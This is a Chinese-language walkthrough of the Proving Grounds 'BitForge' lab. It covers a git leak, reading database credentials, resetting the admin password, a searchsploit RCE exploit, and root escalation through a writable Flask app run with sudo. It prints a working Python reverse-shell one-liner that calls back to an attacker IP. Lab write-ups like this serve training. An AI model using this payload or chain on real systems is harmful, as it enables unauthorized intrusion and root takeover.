---
title: Proving Grounds Practice-BitForge
date: 2025-8-09 20:00:00
tags: 红队
categories: 红队打靶-Linux
---

# 信息收集

## nmap

![image-20250809173624209](./BitForge/image-20250809173624209.png)

## 80端口

将域名解析添加到/etc/hosts

### git泄露

扫目录可以发现git泄露

![image-20250809175344229](./BitForge/image-20250809175344229.png)

![image-20250809180937184](./BitForge/image-20250809180937184.png)

使用一些git泄露的工具，可以将泄露的内容下载到本地，我这里使用[gakki429/Git_Extract: 提取远程 git 泄露或本地 git 的工具](./https://github.com/gakki429/Git_Extract)

![image-20250809175420053](./BitForge/image-20250809175420053.png)

### db-config.php

git泄露了源码内容，其中数据库配置文件中有数据库连接账号密码，上面扫端口时扫到3306端口开放，可以尝试连接到数据库

![image-20250809175625011](./BitForge/image-20250809175625011.png)

跳过ssl验证就可以成功连接到数据库

![image-20250809175656754](./BitForge/image-20250809175656754.png)

在`soplanning`数据库下的`planning_user`表中找到`admin`用户的账号和密码

![image-20250809180849521](./BitForge/image-20250809180849521.png)

使用[Hash Type Identifier - Identify unknown hashes](./https://hashes.com/en/tools/hash_identifier)识别hash类型之后使用hashcat进行爆破，使用rockyou字典没有爆破成功

查看当前用户权限`SHOW GRANTS FOR CURRENT_USER;`

![image-20250809184557041](./BitForge/image-20250809184557041.png)

对soplanning有所有权限，我们不能爆破密码那就尝试修改密码，要修改为和原密码相同的加密方式，最稳定的方法就是去源码中找到初始密码，然后修改为初始密码，源码中加密后的密码肯定是不会出现加密方式不同的问题

![image-20250809200344336](./BitForge/image-20250809200344336.png)

在`SOPlanning github`中找到了默认密码，并且查询后该密码为admin

![image-20250809200414799](./BitForge/image-20250809200414799.png)

![image-20250809200537855](./BitForge/image-20250809200537855.png)





还在`planning_config`表中找到了版本号

![image-20250809182020353](./BitForge/image-20250809182020353.png)

### login.php

在这个源码下还发现一个子域名

![image-20250809183109488](./BitForge/image-20250809183109488.png)

根据数据库名`soplanning`和版本号可以确定，这个页面才是数据库对应的页面，

![image-20250809183155267](./BitForge/image-20250809183155267.png)

上面已经对密码进行修改，这里通过`admin:admin`就可以登录

并且该版本存在经过认证的远程代码执行

![image-20250809183248542](./BitForge/image-20250809183248542.png)

`searchsploit -m 52082`将脚本下载到本地，然后按照使用方法就可以成功getshell

![image-20250809201853315](./BitForge/image-20250809201853315.png)

可以上传一个php的后门，访问以后就可以反弹shell

通过上面脚本得到的shell是对php后门命令执行后的回显，不能进行交互，所以拿到一个可以交互的shell会方便一点

![image-20250809201929747](./BitForge/image-20250809201929747.png)

# 提权

`home`目录下还有`jack`用户和`ubuntu`用户

上传pspy64运行后一段时间就会有个以jack用户运行的进程，利用该密码可以切换到jack用户

![image-20250809204704911](./BitForge/image-20250809204704911.png)

并且可以以sudo权限运行`/usr/bin/flask_password_changer`

![image-20250809204958544](./BitForge/image-20250809204958544.png)

jack用户对该文件没有可写权限，但是可执行

`/usr/bin/flask_password_changer`文件就是运行了一个flask项目，源码是在`/opt/password_change_app`下

![image-20250809205146205](./BitForge/image-20250809205146205.png)

但是`/opt/password_change_app`下的文件jack用户可以修改

![image-20250809205302097](./BitForge/image-20250809205302097.png)

修改app.py，在app.py中添加python语法的反向shell

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.229",3306));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

![image-20250809205938415](./BitForge/image-20250809205938415.png)

然后运行`/usr/bin/flask_password_changer`，就会运行app.py得到root权限的反向hsell

![image-20250809205906926](./BitForge/image-20250809205906926.png)